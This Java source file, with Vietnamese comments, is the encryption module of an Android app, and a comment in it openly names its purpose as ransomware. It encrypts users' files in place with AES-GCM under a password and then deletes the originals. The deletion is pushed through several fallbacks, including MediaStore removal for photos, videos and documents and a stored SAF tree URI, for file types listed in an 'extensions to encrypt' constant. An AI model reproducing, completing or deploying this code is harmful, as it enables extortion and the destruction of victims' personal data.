package com.example.into_demo;

import android.Manifest;
import android.content.ContentResolver;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.provider.MediaStore;
import android.util.Log;

import androidx.core.content.ContextCompat;
import androidx.documentfile.provider.DocumentFile;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.security.SecureRandom;
import java.security.spec.KeySpec;
import java.util.Date;
import java.util.List;

import javax.crypto.Cipher;
import javax.crypto.CipherInputStream;
import javax.crypto.CipherOutputStream;
import javax.crypto.SecretKey;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.spec.SecretKeySpec;

public class AesCrypt {
    private static final String TAG = "SafeAesCrypt";
    private static final int SALT_LEN = 16;
    private static final int IV_LEN = 12;
    private static final int KEY_BITS = 256;
    private static final int ITER = 20000;
    private static final int GCM_TAG_BITS = 128;
    private static final int BUFFER_SIZE = 8192;
    private static final SecureRandom rnd = new SecureRandom();
    private static final int MIN_HEADER_SIZE = SALT_LEN + IV_LEN; // Kích thước header tối thiểu

    private static SecretKey deriveKey(char[] password, byte[] salt) throws Exception {
        SecretKeyFactory skf = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA256");
        KeySpec spec = new PBEKeySpec(password, salt, ITER, KEY_BITS);
        byte[] keyBytes = skf.generateSecret(spec).getEncoded();
        return new SecretKeySpec(keyBytes, "AES");
    }

    /**
     * Encrypt input file -> outFile, và tùy chọn xóa file gốc nếu thành công.
     * @param deleteOriginal true để xóa file gốc sau mã hóa OK (mặc định true cho ransomware).
     * @param context Android Context để dùng ContentResolver cho MediaStore delete (nếu cần).
     * @return true nếu thành công.
     */
    public static boolean encryptFileToNew(File inFile, File outFile, String password, boolean deleteOriginal, Context context) {
        // Kiểm tra quyền truy cập và tính hợp lệ của tệp
        if (!inFile.exists() || !inFile.canRead()) {
            Log.e(TAG, "Cannot read input file: " + inFile.getAbsolutePath());
            return false;
        }
        if (inFile.length() == 0) {
            Log.e(TAG, "Input file is empty: " + inFile.getAbsolutePath());
            return false;
        }
        if (outFile.getParentFile() != null && !outFile.getParentFile().exists()) {
            if (!outFile.getParentFile().mkdirs()) {
                Log.e(TAG, "Cannot create output directory: " + outFile.getParent());
                return false;
            }
        }
        if (outFile.exists() && !outFile.canWrite()) {
            Log.e(TAG, "Cannot write to output file: " + outFile.getAbsolutePath());
            return false;
        }

        byte[] salt = new byte[SALT_LEN];
        rnd.nextBytes(salt);
        byte[] iv = new byte[IV_LEN];
        rnd.nextBytes(iv);

        boolean encryptionSuccess;
        try {
            SecretKey key = deriveKey(password.toCharArray(), salt);
            Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
            GCMParameterSpec gcm = new GCMParameterSpec(GCM_TAG_BITS, iv);
            cipher.init(Cipher.ENCRYPT_MODE, key, gcm);

            try (FileOutputStream fos = new FileOutputStream(outFile);
                 FileInputStream fis = new FileInputStream(inFile);
                 CipherOutputStream cos = new CipherOutputStream(fos, cipher)) {

                // Ghi header: salt + IV
                fos.write(salt);
                fos.write(iv);
                fos.flush();

                // Mã hóa dữ liệu với bộ đệm 8KB
                byte[] buf = new byte[BUFFER_SIZE];
                int r;
                while ((r = fis.read(buf)) != -1) {
                    cos.write(buf, 0, r);
                }
                cos.flush();
                cos.close(); // Đảm bảo close để tránh lock
                encryptionSuccess = true;
                Log.i(TAG, "Encrypted file: " + inFile.getAbsolutePath() + " -> " + outFile.getAbsolutePath() + " at " + new Date().toString());
            }
        } catch (Exception e) {
            Log.e(TAG, "Encryption error for " + inFile.getAbsolutePath() + ": " + e.getMessage() + " at " + new Date().toString(), e);
            // Xóa outFile nếu partial
            if (outFile.exists()) outFile.delete();
            encryptionSuccess = false;
        }

        // Xóa file gốc chỉ nếu mã hóa thành công, file mới hợp lệ, và deleteOriginal = true
        if (encryptionSuccess && deleteOriginal) {
            // Kiểm tra file mới: tồn tại và size > header (để tránh xóa nhầm nếu encode fail)
            if (outFile.exists() && outFile.length() > MIN_HEADER_SIZE) {
                boolean deleted = deleteOriginalSafely(inFile, context);
                if (deleted) {
                    Log.i(TAG, "Deleted original file successfully: " + inFile.getAbsolutePath() + " at " + new Date().toString());
                } else {
                    Log.w(TAG, "Failed to delete original file: " + inFile.getAbsolutePath() + " at " + new Date().toString() + ". Scoped storage issue - consider requesting MANAGE_EXTERNAL_STORAGE.");
                }
            } else {
                Log.w(TAG, "Skipping delete: Output file invalid (size=" + (outFile.exists() ? outFile.length() : 0) + "): " + outFile.getAbsolutePath() + " at " + new Date().toString());
            }
        } else if (!deleteOriginal) {
            Log.i(TAG, "Delete original skipped (deleteOriginal=false): " + inFile.getAbsolutePath() + " at " + new Date().toString());
        }

        return encryptionSuccess;
    }

    /**
     * Mã hóa file và lưu .enc tại vị trí file gốc (overwrite), xóa file gốc sau.
     * @param inFile File gốc cần mã hóa.
     * @param password Password AES.
     * @param context Context cho fallback delete.
     * @return true nếu thành công.
     */
    public static boolean encryptFileInPlace(File inFile, String password, Context context) {
        if (!inFile.exists() || !inFile.canRead()) {
            Log.e(TAG, "Cannot read input file for in-place encrypt: " + inFile.getAbsolutePath());
            return false;
        }

        // Tạo temp file .enc trong private dir
        File tempDir = context.getExternalFilesDir(null);
        if (tempDir == null) {
            Log.e(TAG, "Cannot create temp dir for in-place encrypt");
            return false;
        }
        File tempEncFile = new File(tempDir, inFile.getName() + ".enc");
        boolean encryptSuccess = encryptFileToNew(inFile, tempEncFile, password, false, context); // Encrypt temp, không xóa

        if (encryptSuccess) {
            // Copy temp .enc vào vị trí gốc (rename để overwrite)
            File targetEncFile = new File(inFile.getParent(), inFile.getName() + ".enc");
            if (tempEncFile.renameTo(targetEncFile)) {
                Log.i(TAG, "In-place encrypt: Moved .enc to original location: " + targetEncFile.getAbsolutePath());
                // Xóa file gốc sau khi move success
                return deleteFileSafely(inFile, context);
            } else {
                Log.e(TAG, "Failed to move .enc to original location: " + targetEncFile.getAbsolutePath());
                tempEncFile.delete(); // Cleanup temp
                return false;
            }
        }
        return false;
    }

    /**
     * Delete file gốc an toàn: Thử File.delete() trước, fallback MediaStore cho media files trên API 30+.
     * @param inFile File cần xóa.
     * @param context Android Context để dùng ContentResolver cho MediaStore delete.
     * @return true nếu xóa thành công.
     */
    private static boolean deleteOriginalSafely(File inFile, Context context) {
        if (context == null) {
            Log.w(TAG, "No Context provided for safe delete: falling back to direct delete");
            return inFile.delete();
        }

        // Log permission cho debug
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) { // API 33+
            Log.d(TAG, "READ_MEDIA_IMAGES granted? " + (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED));
        }

        // Thử delete trực tiếp (hoạt động cho app's private dirs hoặc MANAGE granted)
        if (inFile.delete()) {
            Log.i(TAG, "Direct delete success: " + inFile.getAbsolutePath());
            return true;
        }

        // Fallback cho scoped storage (API 30+): Dùng MediaStore cho media files
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) { // API 30
            String path = inFile.getAbsolutePath().toLowerCase();
            Uri uri = null;
            String selection = null;
            String[] selectionArgs = null;

            // Xác định MediaStore collection dựa trên extension (từ Constants)
            int dot = path.lastIndexOf('.');
            if (dot > 0) {
                String ext = path.substring(dot + 1);
                if (Constants.EXTENSIONS_TO_ENCRYPT.contains(ext)) {
                    if (ext.equals("jpg") || ext.equals("jpeg") || ext.equals("png") || ext.equals("bmp") || ext.equals("gif") || ext.equals("webp") || ext.equals("heic")) {
                        // Images
                        uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
                        selection = MediaStore.Images.Media.DATA + "=?";
                        selectionArgs = new String[]{inFile.getAbsolutePath()};
                    } else if (ext.equals("mp4") || ext.equals("avi") || ext.equals("mkv") || ext.equals("3gp")) {
                        // Videos
                        uri = MediaStore.Video.Media.EXTERNAL_CONTENT_URI;
                        selection = MediaStore.Video.Media.DATA + "=?";
                        selectionArgs = new String[]{inFile.getAbsolutePath()};
                    } else if (ext.equals("pdf") || ext.equals("doc") || ext.equals("docx") || ext.equals("txt")) {
                        // Downloads (non-media fallback)
                        uri = MediaStore.Downloads.EXTERNAL_CONTENT_URI;
                        selection = MediaStore.Downloads.DATA + "=?";
                        selectionArgs = new String[]{inFile.getAbsolutePath()};
                    }
                }
            }

            if (uri != null) {
                ContentResolver resolver = context.getContentResolver();
                // Query trước để confirm file tồn tại trong MediaStore
                Cursor cursor = resolver.query(uri, null, selection, selectionArgs, null);
                if (cursor != null && cursor.getCount() > 0) {
                    cursor.close();
                    try {
                        int deletedRows = resolver.delete(uri, selection, selectionArgs);
                        if (deletedRows > 0) {
                            // Xóa file physical sau khi MediaStore delete (nếu còn)
                            inFile.delete();
                            Log.i(TAG, "Deleted via MediaStore: " + inFile.getAbsolutePath());
                            return true;
                        } else {
                            Log.w(TAG, "MediaStore delete returned 0 rows for: " + inFile.getAbsolutePath());
                        }
                    } catch (SecurityException e) {
                        Log.e(TAG, "MediaStore delete failed due to permission: " + e.getMessage());
                    }
                } else {
                    if (cursor != null) cursor.close();
                    Log.w(TAG, "File not found in MediaStore: " + inFile.getAbsolutePath());
                }
            }
        }

        // Fallback SAF nếu có tree URI trong settings
        SharedPreferences prefs = context.getSharedPreferences(Constants.PREFS_NAME, Context.MODE_PRIVATE);
        String safUriString = prefs.getString("saf_tree_uri", null);
        if (safUriString != null) {
            Uri treeUri = Uri.parse(safUriString);
            DocumentFile tree = DocumentFile.fromTreeUri(context, treeUri);
            if (tree != null) {
                DocumentFile targetFile = tree.findFile(inFile.getName());
                if (targetFile != null && targetFile.delete()) {
                    Log.i(TAG, "Deleted via SAF: " + inFile.getAbsolutePath());
                    return true;
                }
            }
        }

        // Nếu tất cả fail, thử force delete (không khuyến khích, chỉ cho debug)
        Log.w(TAG, "All delete methods failed for: " + inFile.getAbsolutePath());
        return false;
    }

    /**
     * Public wrapper cho deleteOriginalSafely (dùng từ MainService).
     */
    public static boolean deleteFileSafely(File file, Context context) {
        boolean deleted = deleteOriginalSafely(file, context);
        Log.i(TAG, "Final delete result for " + file.getAbsolutePath() + ": " + deleted);
        return deleted;
    }

    /**
     * Decrypt inFile -> outFile (tương thích định dạng mã hóa)
     */
    public static boolean decryptFileToNew(File inFile, File outFile, String password) {
        // Kiểm tra quyền truy cập và tính hợp lệ của tệp
        if (!inFile.exists() || !inFile.canRead()) {
            Log.e(TAG, "Cannot read input file: " + inFile.getAbsolutePath());
            return false;
        }
        if (inFile.length() < SALT_LEN + IV_LEN) {
            Log.e(TAG, "Input file too small to be valid: " + inFile.getAbsolutePath());
            return false;
        }
        if (outFile.getParentFile() != null && !outFile.getParentFile().exists()) {
            if (!outFile.getParentFile().mkdirs()) {
                Log.e(TAG, "Cannot create output directory: " + outFile.getParent());
                return false;
            }
        }
        if (outFile.exists() && !outFile.canWrite()) {
            Log.e(TAG, "Cannot write to output file: " + outFile.getAbsolutePath());
            return false;
        }

        try (FileInputStream fis = new FileInputStream(inFile)) {
            // Đọc salt và IV từ header
            byte[] salt = new byte[SALT_LEN];
            if (fis.read(salt) != SALT_LEN) {
                Log.e(TAG, "Invalid salt length in: " + inFile.getAbsolutePath());
                return false;
            }

            byte[] iv = new byte[IV_LEN];
            if (fis.read(iv) != IV_LEN) {
                Log.e(TAG, "Invalid IV length in: " + inFile.getAbsolutePath());
                return false;
            }

            SecretKey key = deriveKey(password.toCharArray(), salt);
            Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
            GCMParameterSpec gcm = new GCMParameterSpec(GCM_TAG_BITS, iv);
            cipher.init(Cipher.DECRYPT_MODE, key, gcm);

            try (CipherInputStream cis = new CipherInputStream(fis, cipher);
                 FileOutputStream fos = new FileOutputStream(outFile)) {
                // Giải mã dữ liệu với bộ đệm 8KB
                byte[] buf = new byte[BUFFER_SIZE];
                int r;
                while ((r = cis.read(buf)) != -1) {
                    fos.write(buf, 0, r);
                }
                fos.flush();
                Log.i(TAG, "Decrypted file: " + inFile.getAbsolutePath() + " -> " + outFile.getAbsolutePath() + " at " + new Date().toString());
                return true;
            }
        } catch (Exception e) {
            Log.e(TAG, "Decryption error for " + inFile.getAbsolutePath() + ": " + e.getMessage() + " at " + new Date().toString(), e);
            return false;
        }
    }
}